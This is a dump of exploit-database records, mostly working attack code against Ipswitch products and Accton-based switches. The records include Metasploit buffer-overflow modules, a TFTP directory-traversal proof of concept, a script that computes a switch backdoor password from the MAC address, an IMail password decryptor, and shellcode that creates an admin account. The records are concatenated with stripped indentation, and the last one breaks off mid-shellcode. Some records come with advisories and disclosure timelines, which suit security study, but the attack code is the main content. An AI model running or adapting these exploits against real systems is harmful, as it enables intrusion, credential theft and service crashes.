AUTHENTICATION         = NOT_REQUIRED
CONFIDENTIALITY_IMPACT = PARTIAL
INTEGRITY_IMPACT       = NONE
AVAILABILITY_IMPACT    = NONE
EXPLOITABILITY         = PROOF_OF_CONCEPT
REMEDIATION_LEVEL      = UNAVAILABLE
REPORT_CONFIDENCE      = CONFIRMED
CVSS Base Score        = 5.0 (AV:N/AC:L/Au:NR/C:P/I:N/A:N)
CVSS Temporal Score    = 4.5
Risk factor            = Medium
Credits:
Prabhu S Angadi of SecPod Technologies has been credited with the discovery of
this vulnerability.
POC :
import sys, socket
def sendPacket(HOST, PORT, data):
Sends UDP Data to a Particular Host on a Specified Port
with a Given Data and Return the Response
udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_sock.sendto(data, (HOST, PORT))
data = udp_sock.recv(1024)
udp_sock.close()
return data
if __name__ == ""__main__"":
if len(sys.argv) < 2:
print '\tUsage: python exploit.py target_ip'
print '\tExample : python exploit.py 127.0.0.1'
print '\tExiting...'
sys.exit(0)
HOST = sys.argv[1]                               ## The Server IP
PORT = 69                                        ## Default TFTP port
data = ""\x00\x01""                                ## TFTP Read Request
data += ""../"" * 10 + ""boot.ini"" + ""\x00""         ## Read boot.ini file using directory traversal
data += ""netascii\x00""                           ## TFTP Type
rec_data = sendPacket(HOST, PORT, data)
print ""Data Found on the target : %s "" %(HOST)
print rec_data.strip()"
2010-04-30,Remote,Windows,Metasploit,IPSwitch IMail LDAP Daemon/Service,Remote Buffer Overflow (Metasploit),"# $Id: imail_thc.rb 9179 2010-04-30 08:40:19Z jduck $
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
# Universal exploit, targets 6.x, 7.x, and 8.x at once ;)
# Thanks for johnny cyberpunk for 6/7 vs 8 diffs","require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = AverageRanking
include Msf::Exploit::Remote::Tcp
def initialize(info = {})
super(update_info(info,
'Name'           => 'IMail LDAP Service Buffer Overflow',
'Description'    => %q{
This exploits a buffer overflow in the LDAP service that is
part of the IMail product. This module was tested against
version 7.10 and 8.5, both running on Windows 2000.
'Author'         => [ 'hdm' ],
'License'        => MSF_LICENSE,
'Version'        => '$Revision: 9179 $',
'References'     =>
[ 'CVE', '2004-0297'],
[ 'OSVDB', '3984'],
[ 'BID', '9682'],
[ 'URL', 'http://secunia.com/advisories/10880/'],
'Privileged'     => false,
'Payload'        =>
'Space'    => 1024,
'BadChars' => ""\x00\x0a\x0d\x20"",
'Platform'       => 'win',
'Targets'        =>
[""Windows 2000 English"",   { 'Ret' => 0x75023386 }],
[""Windows 2000 IMail 8.x"", { 'Ret' => 0x1002a619 }],
'DisclosureDate' => 'Feb 17 2004',
'DefaultTarget' => 0))
register_options(
Opt::RPORT(389)
], self.class)
end
def exploit
connect
buf = ""\x30\x82\x0a\x3d\x02\x01\x01\x60\x82\x01\x36\x02\xff\xff\xff\xff\x20""
buf << ""\xcc"" * 5000
buf[77, 4] = ""\xeb\x06""
buf[81, 4] = [target.ret].pack('V') # 6.x, 7.x
buf[85, 4] = ""\xeb\x06""
buf[89, 4] = [target.ret].pack('V') # 8.x
buf[93, payload.encoded.length] = payload.encoded
sock.put(buf)
handler
disconnect
end
end"
2010-07-14,Remote,Windows,Metasploit,IPSwitch WhatsUp Gold 8.03,Remote Buffer Overflow (Metasploit),"# $Id: ipswitch_wug_maincfgret.rb 9820 2010-07-14 13:59:38Z jduck $
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
# [*] x.x.x.x WhatsUp_Gold/8.0 ( 401-Basic realm=""WhatsUp Gold"" )","require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = GreatRanking
HttpFingerprint = { :pattern => [ /WhatsUp/ ] }
include Msf::Exploit::Remote::HttpClient
def initialize(info = {})
super(update_info(info,
'Name'           => 'Ipswitch WhatsUp Gold 8.03 Buffer Overflow',
'Description'    => %q{
This module exploits a buffer overflow in IPswitch WhatsUp Gold 8.03. By
posting a long string for the value of 'instancename' in the _maincfgret.cgi
script an attacker can overflow a buffer and execute arbitrary code on the system.
'Author'         => [ 'MC' ],
'License'        => MSF_LICENSE,
'Version'        => '$Revision: 9820 $',
'References'     =>
['CVE', '2004-0798'],
['OSVDB', '9177'],
['BID', '11043'],
'DefaultOptions' =>
'EXITFUNC' => 'thread',
'Privileged'     => true,
'Payload'        =>
'Space'    => 500,
'BadChars' => ""\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c"",
'PrependEncoder' => ""\x81\xc4\xff\xef\xff\xff\x44"",
'Platform'       => 'win',
'Targets'        =>
[ 'WhatsUP Gold 8.03 Universal', { 'Ret' => 0x6032e743 } ], # whatsup.dll
'DefaultTarget'  => 0,
'DisclosureDate' => 'Aug 25 2004'))
register_options(
Opt::RPORT(80),
OptString.new('HTTPUSER', [ false, 'The username to authenticate as', 'admin']),
OptString.new('HTTPPASS', [ false, 'The password to authenticate as', 'admin']),
], self.class )
end
def exploit
c = connect
num = rand(65535).to_s
user_pass = ""#{datastore['HTTPUSER']}"" + "":"" + ""#{datastore['HTTPPASS']}""
req   = ""page=notify&origname=&action=return&type=Beeper&instancename=""
req  << rand_text_alpha_upper(811, payload_badchars) + ""\xeb\x06""
req  << make_nops(2) + [target.ret].pack('V') + make_nops(10) + payload.encoded
req  << ""&beepernumber=&upcode="" + num + ""*&downcode=""+ num + ""*&trapcode="" + num + ""*&end=end""
print_status(""Trying target %s..."" % target.name)
res = send_request_cgi({
'uri'          => '/_maincfgret.cgi',
'method'       => 'POST',
'content-type' => 'application/x-www-form-urlencoded',
'data'         => req,
'headers'      =>
'Authorization' => ""Basic #{Rex::Text.encode_base64(user_pass)}""
}, 5)
handler
end
end"
2010-10-05,Remote,Windows,Metasploit,Ipswitch WS_FTP Server 5.03,MKD Overflow (Metasploit),"# $Id: wsftp_server_503_mkd.rb 10559 2010-10-05 23:41:17Z jduck $
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
# Address is executable to allow XP and 2K
# 0x25185bb8 = push esp, ret (libeay32.dll)
# B85B1825XX = mov eax,0xXX25185b","require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = GreatRanking
include Msf::Exploit::Remote::Ftp
def initialize(info = {})
super(update_info(info,
'Name'           => 'WS-FTP Server 5.03 MKD Overflow',
'Description'    => %q{
This module exploits the buffer overflow found in the MKD
command in IPSWITCH WS_FTP Server 5.03 discovered by Reed
Arvin.
'Author'         => [ 'et', 'Reed Arvin <reedarvin@gmail.com>' ],
'License'        => BSD_LICENSE,
'Version'        => '$Revision: 10559 $',
'Platform'       => [ 'win' ],
'References'     =>
[ 'CVE', '2004-1135' ],
[ 'OSVDB', '12509' ],
[ 'BID', '11772'],
'Privileged'     => false,
'Payload'        =>
'Space'    => 480,
'BadChars' => ""\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e"",
'StackAdjustment' => -3500,
'Targets'        =>
'WS-FTP Server 5.03 Universal',
'Ret'      => 0x25185bb8,
'DisclosureDate' => 'Nov 29 2004',
'DefaultTarget' => 0))
end
def check
connect
disconnect
if (banner =~ /5\.0\.3/)
return Exploit::CheckCode::Vulnerable
end
return Exploit::CheckCode::Safe
end
def exploit
connect_login
print_status(""Trying target #{target.name}..."")
buf         = rand_text_alphanumeric(8192)
buf[498, 4] = [ 0x7ffd3001 ].pack('V')
buf[514, 4] = [ target.ret ].pack('V')
buf[518, 4] = [ target.ret ].pack('V')
buf[522, 2] = make_nops(2)
buf[524, payload.encoded.length] = payload.encoded
send_cmd( ['MKD', buf], true );
handler
disconnect
end
end"
2010-04-30,Remote,Windows,Metasploit,Ipswitch WS_FTP Server 5.05,XMD5 Overflow (Metasploit),"# $Id: wsftp_server_505_xmd5.rb 9179 2010-04-30 08:40:19Z jduck $
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/","require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = AverageRanking
include Msf::Exploit::Remote::Ftp
def initialize(info = {})
super(update_info(info,
'Name'           => 'Ipswitch WS_FTP Server 5.05 XMD5 Overflow',
'Description'    => %q{
This module exploits a buffer overflow in the XMD5 verb in
IPSWITCH WS_FTP Server 5.05.
'Author'         => 'MC',
'License'        => MSF_LICENSE,
'Version'        => '$Revision: 9179 $',
'References'     =>
[ 'CVE', '2006-4847' ],
[ 'OSVDB', '28939' ],
[ 'BID', '20076' ],
'Privileged'     => false,
'Payload'        =>
'Space'    => 300,
'BadChars' => ""\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e"",
'StackAdjustment' => -3500,
'Platform' => 'win',
'Targets'        =>
[ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x7c2ec663 } ],
[ 'Windows XP Pro SP0 English',   { 'Ret' => 0x77dc0df0 } ],
[ 'Windows XP Pro SP1 English',   { 'Ret' => 0x77dc5527 } ],
'DisclosureDate' => 'Sep 14 2006',
'DefaultTarget' => 0))
end
def check
connect
disconnect
if (banner =~ /WS_FTP Server 5.0.5/)
return Exploit::CheckCode::Vulnerable
end
return Exploit::CheckCode::Safe
end
def exploit
connect_login
print_status(""Trying target #{target.name}..."")
sploit =  rand_text_alphanumeric(676, payload_badchars)
sploit << [target.ret].pack('V') + payload.encoded
send_cmd( ['XMD5', sploit] , false)
handler
disconnect
end
end"
2010-06-15,Remote,Windows,Metasploit,Ipswitch IMail Server,IMAP SEARCH Buffer Overflow (Metasploit),"# $Id: ipswitch_search.rb 9525 2010-06-15 07:18:08Z jduck $
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/","require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = AverageRanking
include Msf::Exploit::Remote::Imap
def initialize(info = {})
super(update_info(info,
'Name'           => 'Ipswitch IMail IMAP SEARCH Buffer Overflow',
'Description'    => %q{
This module exploits a stack buffer overflow in Ipswitch IMail Server 2006.1 IMAP SEARCH
verb. By sending an overly long string, an attacker can overwrite the
buffer and control program execution.
In order for this module to be successful, the IMAP user must have at least one
message.
'Author'         => [ 'MC' ],
'License'        => MSF_LICENSE,
'Version'        => '$Revision: 9525 $',
'References'     =>
[ 'CVE', '2007-3925' ],
[ 'OSVDB', '36219' ],
[ 'BID', '24962' ],
'Privileged'     => true,
'DefaultOptions' =>
'EXITFUNC' => 'thread',
'Payload'        =>
'Space'    => 400,
'BadChars' => ""\x00\x0a\x0d\x20\x0b\x09\x0c"",
'PrependEncoder' => ""\x81\xc4\xff\xef\xff\xff\x44"",
'Platform'       => 'win',
'Targets'        =>
[ 'Windows 2000 Pro SP4 English',   { 'Ret' => 0x77f81be3 } ],
[ 'Windows 2003 SP0 English',       { 'Ret' => 0x77c5cee8 } ]
'DefaultTarget'  => 0,
'DisclosureDate' => 'Jul 18 2007'))
end
def exploit
sploit =  ""a002 SEARCH BEFORE "" + ""<"" + rand_text_english(87)
sploit << [target.ret].pack('V') + make_nops(20) + payload.encoded + "">""
info = connect_login
if (info == true)
print_status(""Trying target #{target.name}..."")
sock.put(""a001 SELECT INBOX\r\n"")
sock.get_once(-1, 3)
sock.put(sploit + ""\r\n"")
else
print_status(""Not falling through with exploit"")
end
handler
disconnect
end
end"
2010-09-20,Remote,Windows,Metasploit,IPSwitch IMail IMAP4D,Delete Overflow (Metasploit),"# $Id: imail_delete.rb 10394 2010-09-20 08:06:27Z jduck $
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
# alphanum rets :(, will look more into it later
# Jump over code
# GetEIP code
# Alphanumeric jmp back (edx context)
# Run off the stack, so we don't kill our payload, or something...
# Terminate the request","require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = AverageRanking
include Msf::Exploit::Remote::Imap
def initialize(info = {})
super(update_info(info,
'Name'           => 'IMail IMAP4D Delete Overflow',
'Description'    => %q{
This module exploits a buffer overflow in the 'DELETE'
command of the the IMail IMAP4D service. This vulnerability
can only be exploited with a valid username and password.
This flaw was patched in version 8.14.
'Author'         => [ 'spoonm' ],
'License'        => MSF_LICENSE,
'Version'        => '$Revision: 10394 $',
'References'     =>
[ 'CVE', '2004-1520'],
[ 'OSVDB', '11838'],
[ 'BID', '11675'],
'Privileged'     => true,
'DefaultOptions' =>
'EXITFUNC'  => 'thread',
'Payload'        =>
'Space'    => 614,
'BadChars' => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),
'StackAdjustment' => -3500,
'EncoderOptions' =>
'BufferRegister' => 'EDX',
'Platform'       => 'win',
'Targets'        =>
['Windows XP sp0 comctl32.dll', { 'Ret' => 0x77364650 }],
'DisclosureDate' => 'Nov 12 2004',
'DefaultTarget' => 0))
end
def exploit
connect_login
print_status(""Sending overflow string..."")
req = 'A683 DELETE '
req << payload.encoded
req << ""\x74\x32\x75\x30""
req << [target.ret].pack('V')
req << rand_text_alphanumeric(44)
req << ""\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x4c\x5a\x6a\x31\x59""
req << ""\x6b\x42\x34\x49\x30\x42\x4e\x42\x49\x75\x50\x4a\x4a\x52\x52\x59""
req << ""\x6a\x6a\x58\x30\x42\x31\x50\x41\x42\x6b\x42\x41""
req << ""\x7a\x42\x32\x42\x41\x32\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50""
req << ""\x75\x4a\x49\x52\x7a\x71\x4a\x4d\x51\x7a\x4a\x6c\x55\x66\x62\x57""
req << ""\x70\x55\x50\x4b\x4f\x6b\x52\x6a""
req << rand_text_alphanumeric(600)
req << ""\r\n""
sock.put(req)
handler
disconnect
end
end"
2010-09-15,DoS,Windows,Abysssec,Ipswitch Imail Server,List Mailer Reply-To Address Memory Corruption,"http://www.exploit-db.com/moaub-15-ipswitch-imail-server-list-mailer-reply-to-address-memory-corruption/
#ReplayCount = 5
#while ReplayCount>0:
#   message = message + ""Reply-To:""
#   if counter != 50000 :
#      message = message + "",""
#message = message + ""Reply-To: <someone""+str(counter)+""@example.org>""
#   ReplayCount = ReplayCount - 1
#message = message + ""\n""
#print message
#fp = open(""C:\\Program Files\\Ipswitch\\IMail\\spool\\tmp188.tmp"",""w"")
#fp.write(message)
#fp.close()
#print ""wrote""","__  __  ____         _    _ ____
|  \/  |/ __ \   /\  | |  | |  _ \
| \  / | |  | | /  \ | |  | | |_) |
| |\/| | |  | |/ /\ \| |  | |  _ <
| |  | | |__| / ____ \ |__| | |_) |
|_|  |_|\____/_/    \_\____/|____/
Title               :  Ipswitch Imail Server List Mailer Reply-To Address memory corruption
Version             :  Imail server v11.01 and 11.02
Analysis            :  http://www.abysssec.com
Vendor              :  http://www.ipswitch.com
Impact              :  Critical
Contact             :  shahin [at] abysssec.com , info  [at] abysssec.com
Twitter             :  @abysssec
import smtplib
sender = 'from@fromdomain.com'
receivers = ['CrashList@wapteam-f556693']
message = """"""From: From Person <from@fromdomain.com>
To: To Person <CrashList@wapteam-f556693>
counter = 3
while counter>0:
message = message + ""Reply-To: ""+(""A""*200)+""a""*4+""B""*196+""@exam.com""
counter = counter - 1
message = message + ""\n""
message = message + """"""
Subject: SMTP e-mail test
This is a test e-mail message.
try:
smtpObj = smtplib.SMTP('localhost')
smtpObj.sendmail(sender, receivers, message)
print ""Successfully sent email""
except SMTPException:
print ""Error: unable to send email"""
2010-09-02,Remote,Multiple,Edwin Eefting,Accton-based switches (3com / Dell / SMC / Foundry / EdgeCore),Backdoor Password,"#!/usr/bin/perl -w
# Accton Mercury ""__super"" user proof of concept
# Disassembling and first PoC - smite@zylon.net.
# Disassembling and math - psy@datux.nl, gido@datux.nl
# Vereenvoudiging van de loop:
# Was dit:
#     $r11 = ($char * $key) >> 0x23;
#     $r10 = $char >> 0x1F;
#     $r9 = $r11 - $r10;
#     $r11 = $r9 << 2;
#     $r11 = $r11 + $r9;
#     $r9 = $r11 << 4;
#     $r9 = $r9 - $r11;
#     $char = $char - $r9;
#     $char = $char & 0xff;
# Alles substen en bitshifts omrekenen:
# #   $char = $char  - ( (( ( (($char * $key) / 34359738368)  - ($char / 2147483648)) * 4 ) + ((($char * $key) / 34359738368)  - ($char / 2147483648) ) ) * 15) ;
# Vervolgens vereenvoudigen:
# #     $char = $char  - (
# # (
# # ( (
# # (($char * $key) / 34359738368)  - ($char / 2147483648)
# # ) * 4 )
# # +
# # (
# # (($char * $key) / 34359738368)  - ($char / 2147483648)
# # )
# # ) * 15
# # ) ;
# #     $char = $char  - (
# # (
# # ( (
# # 4*( ($char * $key) / 34359738368)  - 4*($char / 2147483648)
# # ) )
# # +
# # (
# # (($char * $key) / 34359738368)  - ($char / 2147483648)
# # )
# # ) * 15
# # ) ;
# Termen die afgerond altijd 0 zijn vallen weg!
# print ""char is $char (max is 510)\n"";
# print 510 / 2147483648  .""\n"";
# print ""\n"";
# Dit kun je zien als bitshifts die alle bits naar rechts shiften:
# #     $char = $char  - (
# # (
# # ( (
# # (4* ( $char * $key / 34359738368)  )
# # ) )
# # +
# # (
# # (($char * $key) / 34359738368)  - ($char / 2147483648)
# # )
# # ) * 15
# # ) ;
# #     $char = $char  - (
# # (
# # ( (
# # (4* ( $char * $key / 34359738368)  )
# # ) )
# # +
# # (
# # (($char * $key) / 34359738368)
# # )
# # ) * 15
# # ) ;
# #     $char = $char  - (
# # (
# # ( (
# # (5* ( $char * $key / 34359738368)  )
# # ) )
# # ) * 15
# # ) ;
# #     $char = $char  - (75* ( $char * $key / 34359738368)   )  ;
# # Dit is een shift naar rechts van 35:
# #     $char = $char  - (75* ( $char * $key >> 35)   )  ;
# PWNED! ;)
#after printing out all the possible combinations, the only thing left was a modulo function!!!
#double pownage!!
# my $output;
# for ($char=0;$char<=0x1FE;$char++) {
# $output = $char - (75 * (($char * 0x1B4E81B5 ) >> 35)   )  ;
# my $cool;
# $cool = $char % 75 ;
# if ($cool != $output)
# {
# print ""$char word $output en is cool $cool\n"";
# }
# }","On the 15th of august 2009, at the HAR2009 conference, the existence of a backdoor password in Accton-based switches was revealed by Edwin Eefting, Erik Smit and Erwin Drent [1][2]. Even though this is a >365-day exploit, it does not seem to be listed in any of the vulnerability databases. Also, I could not find a patch for any of the vulnerable devices. According to the researchers, they contacted 3Com and Accton, but did not receive a response. I have a vulnerable 3Com 3812 in my lab and contacted the 3Com SRT months ago, but did not receive a response either. This seems to be a forgotten bug...
The Accton company builds switches, which are rebranded and sold by several manufacturers (including 3Com, Dell, SMC, Foundry and EdgeCore). The researchers list at least the 3Com 3812, 3Com 3870 and Edgecore ES4649 as vulnerable[3], but other vendors are affected as well. For example, I could also reproduce the behavior on a Dell PowerConnect 5224 switch.
The backdoor password can be calculated if you have the switch MAC-address, which can be obtained via ARP or SNMP (if you know the community string). It seems to work on all management interfaces: telnet, ssh and http. If you don't know the MAC-address but can guess the OUI, brute forcing the password is probably feasible as well. A perl script (accton.pl) to calculate the password from the MAC address is available at [4].
I'm hoping as a result of this e-mail, this will end up in vulnerability databases, scanners etc. I believe more vulnerable devices will show up as people start scanning their networks.
A sample SSH session with my 3Com 3812, running the latest available firmware (2.00):
$ snmpget -v1 -c public 192.168.104.99 IF-MIB::ifPhysAddress.1001
IF-MIB::ifPhysAddress.1001 = STRING: 0:d:54:9d:1b:90
$ perl accton.pl 0:d:54:9d:1b:90
!F!RELUO
$ ssh __super@192.168.104.99
__super@192.168.104.99's password: !F!RELUO
Menu options: -------3Com SuperStack 3 Switch 3812 12-port---------------------
bridge              - Administer bridge-wide parameters
feature             - Administer system features
gettingStarted      - Basic device configuration
logout              - Logout of the Command Line Interface
physicalInterface   - Administer physical interfaces
protocol            - Administer protocols
security            - Administer security
system              - Administer system-level functions
trafficManagement   - Administer traffic management
Type ? for help.
------------------------------------- (1)--------------------------------------
Select menu option:
-------------------------------------references--------------------------------
[1] HAR2009 talk https://har2009.org/program/events/103.en.html <https://har2009.org/program/events/103.en.html>
[2] HAR2009 slides http://www.vettebak.nl/hak/ <http://www.vettebak.nl/hak/>
[3] Backdoor description http://stuff.zoiah.net/doku.php?id=accton:backdoor <http://stuff.zoiah.net/doku.php?id=accton:backdoor>
[4] Exploit calculator http://www.vettebak.nl/hak/accton.pl <http://www.vettebak.nl/hak/accton.pl>
---------------------------------------EOF-------------------------------------
use strict;
my $counter;
my $char;
my $mac = $ARGV[0];
my @mac;
foreach my $octet (split ("":"", $mac)) {
push @mac, hex($octet);
if (!defined $mac[5]) {
print ""Usage: ./accton.pl 00:01:02:03:04:05\n"";
exit 1;
sub printchar {
my ($char) = @_;
$char = $char % 0x4b;
if ($char <= 9 || ($char > 0x10 && $char < 0x2a) || $char > 0x30) {
print pack(""c*"", $char+0x30);
} else {
print ""!"";
for ($counter=0;$counter<5;$counter++) {
$char = $mac[$counter];
$char = $char + $mac[$counter+1];
printchar($char);
for ($counter=0;$counter<3;$counter++) {
$char = $mac[$counter];
$char = $char + $mac[$counter+1];
$char = $char +  0xF;
printchar($char);
print ""\n"";"
2010-02-04,Local,Windows,sinn3r,Ipswitch IMAIL 11.01,Reversible Encryption + weak ACL,"#!/usr/bin/python
# Ipswitch IMail Server - IMAP4 Server (IMail 11.01) Password Decryptor
# Tested on: Windows XP SP3 (Windows version does not matter)
# Description:
# So I reverse engineered the IMail password decryption function in
# IMailsec.dll, located at 0x00563130.
# In order to decrypt correctly, you must have the correct username,
# because it is used as a key.
# All usernames and passwords are stored in registry, which can be
# found at:
# HKEY_LOCAL_MACHINE\SOFTWARE\Ipswitch\IMail\Domains\[domain name]\Users
# Every registry key under ""Users"" has a string value named ""Password"",
# in there you'll find the encrypted password.
# By default, Internet Guest Account is granted with ""Full Control"" to
# the IMail registry, and its directory.  That means if an attacker
# manages to gain code execution (ie.via a web app bug), IMail can be
# his/her next playground.  And IMail users may not be safe.
# Demo:
# sinn3r@bt4:~$ ./iMailDecrypt.py admin C8D3D19AA094
# Ipswitch IMail Server - IMAP4 Server (IMail 11.01) Password Decryptor
# coded by sinn3r  -  x90.sinner{at}gmail.c0m
# [*] Password = god123
# Responsible Disclosure Timeline:
# 1/21/2010  -  IMail vendor contacted
# 1/26/2010  -  Got a reply from the vendor for more vulnerability
#clarfication.  No fix yet.
# 2/02/2010  -  Received another reply from the vendor: Issues logged for
#additional research.  No plans for immediate changes.
#A public advisory was also suggested by the vendor as
#reference in their tech/KB article.
# 2/04/2010  -  Public Disclosure.  Vendor informed again.
## Convert the encrypted string to integers for calculation
## Returns the integer version as a list
## Decrypt the password
## Returns the decrypted version as a list","|                         __               __                      |
|   _________  ________  / /___ _____     / /____  ____ _____ ___  |
|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
|                                                                  |
|                                       http://www.corelan.be:8800 |
|                                                                  |
|-------------------------------------------------[ EIP Hunters ]--|
Advisory: CORELAN-10-009
Disclosure Date: Feb 4th, 2010
0x00 : Vulnerability Information
[+] Product  : IMail Server
[+] Version  : 11.01
[+] Vendor   : Ipswitch
[+] URL     : http://www.ipswitch.com/
[+] Platform : Windows
[+] Issue fix: No
[+] Vulnerability discovered by: sinn3r
[+] Greetings to: Corelan Security Team::corelanc0d3r/EdiStrosar/Rick2600/MarkoT/mr_me/ekse/sinn3r/Jacky;
and all the guys with secret identities at exploit-db.com  :-p
[+] Special thanks to: Jason from Ipswitch
0x01 : Vendor Description of Software
""The Award-winning IMail Server is a proven email messaging solution for small and mid-sized businesses.
Reliable, scalable and versatile, IMail Server is an affordable choice that meets the messaging needs
of small and medium sized businesses. Unlike complicated and more expensive messaging solutions, IMail
Server delivers a quick and easy installation. As a scalable, standards-based, email server with Webmail,
optional integration with Microsoft Exchange ActiveSync®, SMTP, POP, IMAP, LDAP, and List Server, IMail
users can send and receive email using any standards-based client, including Microsoft Outlook®,
Outlook Express®, or Eudora®. Or, users can access email from anywhere via IMail's customizable Web
messaging, available in eight languages.
Designed to place minimal ongoing maintenance burden on network administrators, IMail can authenticate
users from its own database, an active directory database, or from any ODBC-compliant data store, making
life easier for the busy administrator. IMail Server also delivers a quick and easy installation or upgrade
process.""
0x02 : Vulnerability Details
1. By default, IMail allows Internet Guest Account to have ""Full Control"" to the following registry key,
including its subkeys and values. As well as the default IMail directory:
HKEY_LOCAL_MACHINE\SOFTWARE\Ipswitch\IMail
C:\Program Files\Ipswitch\IMail\
2. The IMail password decryption algorithm implemented in IMailsec.dll is also reversible.
0x03 : Vendor Communication
1/21/2010 - IMail vendor contacted
1/26/2010 - Got a reply from the vendor (product development manager) for more vulnerability clarification.
No fix yet.
2/02/2010 - Received another reply from the vendor: Issues logged for additional research.  No plans for
immediate changes.  A public advisory was also suggested by the vendor as reference in their
tech/KB article.
2/04/2010 - Public disclosure: Advisory created.  Vendor informed.
0x04 : Exploit/Proof-of-Concept
import sys
import binascii
def convertToInt(data):
charset = []
for char in (data):
tmp = char.encode(""hex"")
tmp = int(tmp, 16)
charset.append(tmp)
return charset
def decryptPassword(intUsername, intPassword):
results = []
counter = 0
counter2 = 0
pwdLength = len(intPassword)
while counter<pwdLength:
firstByte = intPassword[counter]
if firstByte <= 57:#0x39
firstByte -= 48#0x30
else:
firstByte -= 55#0x37
firstByte *= 16#SHL 0x40
secondByte = intPassword[counter+1]
if secondByte <= 57:#0x39
secondByte -= 48#0x30
else:
secondByte -= 55#0x37
tmp = firstByte + secondByte
if len(intUsername) <= counter2:
counter2 = 0
if intUsername[counter2] > 54:#0x41
if intUsername[counter2] < 90:#5A
intUsername[counter2] += 32#0x20
tmp -= intUsername[counter2]
counter2 += 1
results.append(hex(tmp)[2:])
counter += 2
return results
banner = """"""Ipswitch IMail Server - IMAP4 Server (IMail 11.01) Password Decryptor
coded by sinn3r  -  x90.sinner{at}gmail{d0t}c0m""""""
print banner
if len(sys.argv) == 3:
if len(sys.argv[2]) % 2 == 0:
username = convertToInt(sys.argv[1])
password = convertToInt(sys.argv[2])
decryptor = str("""".join(decryptPassword(username, password)))
print ""[*] Password = %s"" %binascii.unhexlify(decryptor)
else:
print ""[*] Incorrect Encrypted password length""
else:
print ""[*] Usage: %s <username> <encrypted password>"" %sys.argv[0]"
2010-01-01,DoS,Windows,jacky,Switch Sound File Converter,'.mpga' Buffer Overflow (Denial of Service) (PoC),"# Exploit Title: Switch Sound File Converter .mpga BOF DOS
# Date: 2009-1-1
# Author: Jacky
# Version: 0.0.0.0
# Tested on: Windows XP SP2
#Switch Sound File Converter .mpga BOF POS Vulnerability
#Discovered and written by : ( Jacky )
#Greetz to Corelan team and Peter Van Eeckhoutte !!!
#When you create a file that contains 30k of A's with .mpga extension , and load it then play it from Switch Sound File converter , it crashs !!!","my $file=""Crash.mpga"";
my $junk=""A""x30000;
open(INI,"">$file"");
print INI $junk;
print ""[+]File Created Successfully!\n"";
print ""[+]By Jacky!!!\n"";
close(INI);"
2009-09-14,Remote,Windows,dmc,IPSwitch IMAP Server 9.20,Remote Buffer Overflow,"/* Ipsbitch.cpp vs Ipswitch IMAP
#include ""stdafx.h""
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include ""winsock2.h""
#pragma comment(lib, ""ws2_32"")
#define usage(){ (void)fprintf(stderr, ""Ipsbitch vs Ipswitch IMAP <=v9.20\n(C) dmc <dmc@deadbeef.co.uk>\n\nExample: ipsbitch.exe [ip] [port] [user] [password]\n"");}
#define error(e){ (void)fprintf(stderr,""%s\n"",e); return -1;}
// USER=r00t PASS=r00tr00t!!
// Bad Chars = '\x00\x0a\x0d\x0b\x09\x0c\x20'
// Encoded with shikata ga nai
//ws2help.dll - 0x75022AC4 - pop/pop/ret
// short jmp nop nop
// milw0rm.com [2009-09-14]","* Tested on: Windows 2000 SP4
* Ref: CVE-2007-2795
* Author: Dominic Chell <dmc@deadbeef.co.uk>
* Found this half written on a VM so decided to finish it.
* Payload adds a local admin account USER=r00t PASS=r00tr00t!!
char shellcode[] =
""\xda\xd4\x29\xc9\xb8\xb3\xfe\x8b\x54\xd9\x74\x24\xf4\xb1\x32""
""\x5f\x83\xef\xfc\x31\x47\x14\x03\x47\xa7\x1c\x7e\xa8\x2f\xa4""
""\x81\x51\xaf\xae\xc7\x6d\x24\xcc\xc2\xf5\x3b\xc2\x46\x4a\x23""
""\x97\x06\x75\x52\x4c\xf1\xfe\x60\x19\x03\xef\xb9\xdd\x9d\x43""
""\x3d\x1d\xe9\x9c\xfc\x54\x1f\xa2\x3c\x83\xd4\x9f\x94\x70\x11""
""\x95\xf1\xf2\x46\x71\xf8\xef\x1f\xf2\xf6\xa4\x54\x5b\x1a\x3a""
""\x80\xef\x3e\xb7\x57\x1b\xb7\x9b\x73\xdf\x04\x7c\x4d\x29\xea""
""\xd5\xc9\x5e\xac\xe9\x9a\x21\x3c\x81\xed\xbd\x91\x1e\x65\xb6""
""\x60\xd8\xf5\x06\x18\x49\x92\x76\x56\x6d\x3d\x1f\xfe\x90\x4b""
